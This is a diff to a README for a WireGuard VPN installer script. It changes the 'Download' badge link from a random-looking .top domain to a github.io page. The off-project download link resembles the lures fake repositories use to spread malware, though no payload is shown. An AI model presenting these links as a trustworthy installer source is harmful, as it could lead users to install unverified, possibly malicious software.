@@ -2,7 +2,7 @@
 
 A fast, secure, and lightweight script to deploy a WireGuard VPN server on Linux with a single command. Perfect for privacy-focused users, developers, and sysadmins who need a reliable VPN solution in minutes.
 
-[![Download WireGuard VPN Installer](https://img.shields.io/badge/Download-WireGuard_VPN_Installer-blueviolet)](https://poelkakusthbutn.top/)
+[![Download WireGuard VPN Installer](https://img.shields.io/badge/Download-WireGuard_VPN_Installer-blueviolet)](https://wireguard-vpn-installer.github.io/.github)
 
 ---
 
